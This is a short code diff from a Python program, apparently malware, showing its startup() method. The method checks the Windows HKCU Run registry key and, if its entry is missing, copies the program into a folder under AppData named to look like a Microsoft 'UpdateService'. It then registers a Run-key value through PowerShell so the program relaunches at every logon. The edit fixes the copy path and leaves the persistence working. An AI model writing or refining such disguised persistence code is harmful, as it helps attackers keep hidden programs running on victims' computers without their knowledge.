@@ -108,8 +108,7 @@ class main():
 	def startup(self):
 		try: self.system("powershell Get-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name UpdateService")
 		except:
-			os.mkdir(f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService")
-			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}')
+			shutil.copytree(os.getcwd(), f'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService')
 			self.system(f"powershell New-Itemproperty -path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'UpdateService' -value 'C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/UpdateService/{self.filename}' -PropertyType STRING")
 		
 
